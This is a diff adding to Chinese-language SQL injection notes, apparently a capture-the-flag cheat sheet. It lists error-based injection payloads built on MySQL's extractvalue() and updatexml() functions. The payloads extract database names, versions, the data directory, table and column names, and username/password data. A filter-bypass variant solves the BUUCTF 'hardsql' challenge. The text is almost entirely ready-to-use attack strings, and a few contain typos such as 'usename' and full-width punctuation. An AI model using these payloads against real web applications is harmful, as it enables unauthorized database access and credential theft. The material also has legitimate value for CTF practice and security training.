@@ -12,3 +12,39 @@ union select 1,2,group_concat(table_name) from information_schema.tables where t
 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='表名' --+
 爆数据
 id=-1' union select 1,2,group_concat(username,password) from 表名 --+
+
+5：报错注入（数据库的报错有明显回显）
+
+extractvalue() 函数
+
+获取数据库名称及版本信息
+?id=1' and extractvalue(1,concat(0x7e,database(),0x7e，version(),0x7e)) --+
+差库名
+'^extractvalue(1,concat(0x7e,(select(database()))))%23
+获取当前数据库位置
+?id=1' and extractvalue(1,concat(0x7e,@@datadir,0x7e)) --+
+爆列
+?id=1' and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name='表名' limit 0,1),0x7e)) --+
+爆数据
+?id=1' and extractvalue(1,concat(0x7e,（select usename from users limit 0,1),0x7e)) --+
+爆表
+1'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema='geek'))))
+
+updatexml() 函数\
+
+爆库名
+?id=1' and updatexml(1,concat(0x7e,(database()),0x7e),1) --+
+爆表名
+?id=1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='库名' limit 0,1 ),0x7e),1) --+
+爆列名
+?id=1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='表名' and table_schema='库名' limit 0,1 ),0x7e),1) --+
+爆数据
+?id=1' and updatexml(1,concat(0x7e,（select group_concat(usename,password) from 表名 limit 0,1),0x7e)) --+
+
+报错注入真实（buu hardsql）(过滤了空格和union和等号)
+
+1'^updatexml(1,concat(0x7e,(database()),0x7e),1)#
+/check.php?username=admin&password=admin'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like('geek')))))#
+1'^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like('H4rDsq1')))))#
+
+extractvalue(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1))))
